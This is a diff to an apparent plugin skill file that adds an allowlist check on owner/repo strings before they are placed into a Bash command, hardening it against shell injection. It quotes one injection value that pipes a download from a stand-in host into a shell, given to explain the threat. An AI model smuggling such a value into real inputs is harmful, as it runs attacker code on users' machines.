@@ -41,9 +41,28 @@ No LLM. No API tokens. Just `git`, `node`, filesystem ops, native JSON parsing i
 
 `<project>/.ievo/cache/index/`
 
-### 2. Per-repo invocation
+### 2. Validate each `<owner>/<repo>`
 
-For each repo in the input list, run:
+Before building the Bash command in Step 3, validate every `<owner>/<repo>`
+string in the input list. It does not come from something the user typed and
+personally vetted — when dispatched from `/ievo:init` it is sourced from
+`discover.mjs`'s `candidates[].source_repo` field, itself pulled from the
+public, externally-writable skills.sh API / a marketplace catalog entry. A
+crafted value such as `` foo/`curl evil.tld|sh` `` is a perfectly legal
+string in that response even though it isn't a legal GitHub slug, and would
+be shell-interpreted the moment Step 3's literal Bash command line is built
+and executed.
+
+Check `<owner>` against `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$` and `<repo>`
+against `^[A-Za-z0-9._-]{1,100}$` (matching `scan_repo.mjs`'s own
+`OWNER_REPO_RE` constant). If either fails, refuse and report "invalid
+characters" for that repo instead of interpolating it into Step 3 — do NOT
+run the Bash command for that entry. Continue with the remaining (valid)
+repos in the input list.
+
+### 3. Per-repo invocation
+
+For each validated repo in the input list, run:
 
 ```bash
 node "${CLAUDE_PLUGIN_ROOT}/scripts/scan_repo.mjs" \
@@ -61,11 +80,11 @@ It prints one-line summary to stdout:
 
 Collect these summary lines for the caller.
 
-### 3. Force-refresh flag
+### 4. Force-refresh flag
 
 If caller specifies `force_refresh=true`, append `--force-refresh` to the Node command. Otherwise the script honors TTL cache (7 days).
 
-### 4. Network failure handling
+### 5. Network failure handling
 
 `scan_repo.mjs` handles its own network errors:
 - If `git clone`/`fetch` fails and a stale checkout exists, use it
@@ -87,6 +106,7 @@ When invoked from `/ievo:init`, the caller dispatches `repo-indexer` sub-agents 
 - **Output dir defaults to project's `.ievo/cache/index/`.** Pass explicit `--output-dir` if caller wants elsewhere (community-index GHA uses its own location).
 - **Checkout dir is user-level.** Default `~/.ievo/checkouts/` shared across projects.
 - **Script version is `SCRIPT_VERSION` constant.** Bumped when the scanner output format changes. `scan_repo.mjs` tracks its own format version independently (not coupled to `plugin.json`). `discover.mjs` DOES keep its `SCRIPT_VERSION` in sync with `plugin.json` — enforced by the coupling test in `discover.test.mjs`.
+- **Never interpolate an unvalidated `<owner>/<repo>` into the Step 3 Bash command.** `scan_repo.mjs` enforces its own `OWNER_REPO_RE` allowlist internally, but that only protects paths the script constructs *after* it receives the string — it cannot retroactively protect the Bash command line Step 3 builds to invoke it in the first place. Step 2's allowlist check is what closes that gap; skipping it (e.g. because "the script re-checks anyway") reopens CWE-78 at the SKILL.md level.
 
 ## Why this architecture
 
